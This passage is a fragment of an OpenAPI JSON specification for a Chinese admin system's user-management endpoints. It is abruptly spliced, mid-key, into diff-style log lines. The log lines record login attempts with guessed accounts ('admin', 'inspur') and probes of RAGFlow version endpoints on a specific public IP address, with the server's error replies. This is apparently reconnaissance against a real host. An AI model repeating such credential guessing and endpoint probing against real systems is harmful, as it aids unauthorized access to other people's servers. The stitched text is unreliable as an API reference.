Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DataResponseModel_list_DeptTreeModel__"}}}}}}},"/system/user/list":{"get":{"tags":["系统管理-用户管理"],"summary":"获取用户分页列表接口","description":"用于获取用户分页列表","operationId":"get_system_user_list_system_user_list_get","parameters":[{"name":"userId","in":"query","required":false,"schema":{"anyOf":[{"type":"integer"},{"type":"null"}],"description":"用户ID","title":"Userid"},"description":"用户ID"},{"name":"deptId","in":"query","required":false,"schema":{"anyOf":[{"type":"integer"},{"type":"null"}],"description":"部门ID","title":"Deptid"},"description":"部门ID"},{"name":"userName","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"用户账号","title":"Username"},"description":"用户账号"},{"name":"nickName","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"用户昵称","title":"Nickname"},"description":"用户昵称"},{"name":"userType","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"用户类型（00系统用户）","title":"Usertype"},"description":"用户类型（00系统用户）"},{"name":"email","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"用户邮箱","title":"Email"},"description":"用户邮箱"},{"name":"phonenumber","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"手机号码","title":"Phonenumber"},"description":"手机号码"},{"name":"sex","in":"query","required":false,"schema":{"anyOf":[{"enum":["0","1","2"],"type":"string"},{"type":"null"}],"description":"用户性别（0男 1女 2未知）","title":"Sex"},"description":"用户性别（0男 1女 2未知）"},{"name":"avatar","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"头像地址","title":"Avatar"},"description":"头像地址"},{"name":"password","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"密码","title":"Password"},"description":"密码"},{"name":"status","in":"query","required":false,"schema":{"anyOf":[{"enum":["0","1"],"type":"string"},{"type":"null"}],"description":"帐号状态（0正常 1停用）","title":"Status"},"description":"帐号状态（0正常 1停用）"},{"name":"delFlag","in":"query","required":false,"schema":{"anyOf":[{"enum":["0","2"],"type":"string"},{"type":"null"}],"description":"删除标志（0代表存在 2代表删除）","title":"Delflag"},"description":"删除标志（0代表存在 2代表删除）"},{"name":"loginIp","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"最后登录IP","title":"Loginip"},"description":"最后登录IP"},{"name":"loginDate","in":"query","required":false,"schema":{"anyOf":[{"type":"string","format":"date-time"},{"type":"null"}],"description":"最后登录时间","title":"Logindate"},"description":"最后登录时间"},{"name":"pwdUpdateDate","in":"query","required":false,"schema":{"anyOf":[{"type":"string","format":"date-time"},{"type":"null"}],"description":"密码最后更新时间","title":"Pwdupdatedate"},"description":"密码最后更新时间"},{"name":"createBy","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"创建者","title":"Createby"},"description":"创建者"},{"name":"createTime","in":"query","required":false,"schema":{"anyOf":[{"type":"string","format":"date-time"},{"type":"null"}],"description":"创建时间","title":"Createtime"},"description":"创建时间"},{"name":"updateBy","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"更新者","title":"Updateby"},"description":"更新者"},{"name":"updateTime","in":"query","required":false,"schema":{"anyOf":[{"type":"string","format":"date-time"},{"type":"null"}],"description":"更新时间","title":"Updatetime"},"description":"更新时间"},{"name":"remark","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"备注","title":"Remark"},"description":"备注"},{"name":"admin","in":"query","required":false,"schema":{"anyOf":[{"type":"boolean"},{"type":"null"}],"description":"是否为admin","default":false,"title":"Admin"},"description":"是否为admin"},{"name":"beginTime","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"开始时间","title":"Begintime"},"description":"开始时间"},{"name":"endTime","in":"query","required":false,"schema":{"anyOf":[{"type":"string"},{"type":"null"}],"description":"结束时间","title":"Endtime"},"description":"结束时间"},{"name":"pageNum","in":"query","required":false,"schema":{"type":"integer","description":"当前页码","default":1,"title":"Pagenum"},"description":"当前页码"},{"name":"pageSize","in":"query","required":false,"schema":{"type":"integer","description":"每页记录数","default":10,"title":"Pagesize"},"description":"每页记录数"}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/PageResponseModel_UserRowModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user":{"put":{"tags":["系统管理-用户管理"],"summary":"编辑用户接口","description":"用于编辑用户","operationId":"edit_system_user_system_user_put","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/EditUserModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]},"post":{"tags":["系统管理-用户管理"],"summary":"新增用户接口","description":"用于新增用户","operationId":"add_system_user_system_user_post","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/AddUserModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/{user_ids}":{"delete":{"tags":["系统管理-用户管理"],"summary":"删除用户接口","description":"用于删除用户","operationId":"delete_system_user_system_user__user_ids__delete","security":[{"OAuth2PasswordBearer":[]}],"parameters":[{"name":"user_ids","in":"path","required":true,"schema":{"type":"string","description":"需要删除的用户ID","title":"User Ids"},"description":"需要删除的用户ID"}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/resetPwd":{"put":{"tags":["系统管理-用户管理"],"summary":"重置用户密码接口","description":"用于重置用户密码","operationId":"reset_system_user_pwd_system_user_resetPwd_put","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/EditUserModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/changeStatus":{"put":{"tags":["系统管理-用户管理"],"summary":"修改用户状态接口","description":"用于修改用户状态","operationId":"change_system_user_status_system_user_changeStatus_put","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/EditUserModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/profile":{"get":{"tags":["系统管理-用户管理"],"summary":"获取用户个人信息接口","description":"用于获取当前登录用户的个人信息","operationId":"query_detail_system_user_profile_system_user_profile_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_UserProfileModel_"}}}}},"security":[{"OAuth2PasswordBearer":[]}]},"put":{"tags":["系统管理-用户管理"],"summary":"修改用户个人信息接口","description":"用于修改当前登录用户的个人信息","operationId":"change_system_user_profile_info_system_user_profile_put","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/UserInfoModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/":{"get":{"tags":["系统管理-用户管理"],"summary":"获取用户岗位和角色列表接口","description":"用于获取当前登录用户可见的岗位和角色列表","operationId":"query_detail_system_user_system_user__get","security":[{"OAuth2PasswordBearer":[]}],"parameters":[{"name":"user_id","in":"query","required":false,"schema":{"anyOf":[{"type":"integer"},{"const":"","type":"string"},{"type":"null"}],"default":"","title":"User Id"}}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_UserDetailModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/{user_id}":{"get":{"tags":["系统管理-用户管理"],"summary":"获取用户详情接口","description":"用于获取指定用户的详情信息","operationId":"query_detail_system_user_system_user__user_id__get","security":[{"OAuth2PasswordBearer":[]}],"parameters":[{"name":"user_id","in":"path","required":true,"schema":{"anyOf":[{"type":"integer"},{"const":"","type":"string"},{"type":"null"}],"title":"User Id"}}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_UserDetailModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/profile/avatar":{"post":{"tags":["系统管理-用户管理"],"summary":"修改用户头像接口","description":"用于修改当前登录用户的头像","operationId":"change_system_user_profile_avatar_system_user_profile_avatar_post","requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_change_system_user_profile_avatar_system_user_profile_avatar_post"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_AvatarModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/profile/updatePwd":{"put":{"tags":["系统管理-用户管理"],"summary":"修改用户密码接口","description":"用于修改当前登录用户的密码","operationId":"reset_system_user_password_system_user_profile_updatePwd_put","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResetPasswordModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/system/user/importData":{"post":{"tags":["系统管理-用户管理"],"summary":"批量导入用户接口","description":"用于批量导入用户数据","operationId":"batch_import_system_user_system_user_importData_post","security":[{"OAuth2PasswordBearer":[]}],"parameters":[{"name":"updateSupport","in":"query","required":true,"schema":{"type":"boolean","title":"Updatesupport"}}],"requestBody":{"required":true,"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_batch_import_system_user_system_user_importData_post"}}}},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/importTemplate":{"post":{"tags":["系统管理-用户管理"],"summary":"获取用户导入模板接口","description":"用于获取用户导入模板excel文件","operationId":"export_system_user_template_system_user_importTemplate_post","responses":{"200":{"description":"流式返回导入用户模板excel文件","content":{"application/octet-stream":{}}}}}},"/system/user/export":{"post":{"tags":["系统管理-用户管理"],"summary":"导出用户列表接口","description":"用于导出当前符合查询条件的用户列表数据","operationId":"export_system_user_list_system_user_export_post","requestBody":{"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/UserPageQueryModel"}}},"required":true},"responses":{"200":{"description":"流式返回用户列表excel文件","content":{"application/octet-stream":{}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/authRole/{user_id}":{"get":{"tags":["系统管理-用户管理"],"summary":"获取用户已分配角色列表接口","description":"用于获取指定用户已分配的角色列表","operationId":"get_system_allocated_role_list_system_user_authRole__user_id__get","parameters":[{"name":"user_id","in":"path","required":true,"schema":{"type":"integer","description":"用户ID","title":"User Id"},"description":"用户ID"}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_UserRoleResponseModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/system/user/authRole":{"put":{"tags":["系统管理-用户管理"],"summary":"给用户分配角色接口","description":"用于给指定用户分配角色","operationId":"update_system_role_user_system_user_authRole_put","security":[{"OAuth2PasswordBearer":[]}],"parameters":[{"name":"userId","in":"query","required":true,"schema":{"type":"integer","title":"Userid"}},{"name":"roleIds","in":"query","required":true,"schema":{"type":"string","title":"Roleids"}}],"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema===== login tries
+LOGIN admin -> 400
+{"code":400,"msg":"当前接口要求使用加密传输","success":false}
+LOGIN admin -> 400
+{"code":400,"msg":"当前接口要求使用加密传输","success":false}
+LOGIN inspur -> 400
+{"code":400,"msg":"当前接口要求使用加密传输","success":false}
+LOGIN admin -> 400
+{"code":400,"msg":"当前接口要求使用加密传输","success":false}
+### D7-18080-ragflow-ver
+===== http://123.184.7.135:18080/v1/system/version
+{"code":404,"data":null,"error":"Not Found","message":"Not Found: /v1/system/version"}
+
+===== http://123.184.7.135:18080/api/v1/system/version
+{"code":401,"data":null,"message":"<Unauthorized '401: Unauthorized'>"}
+
+### DONE7
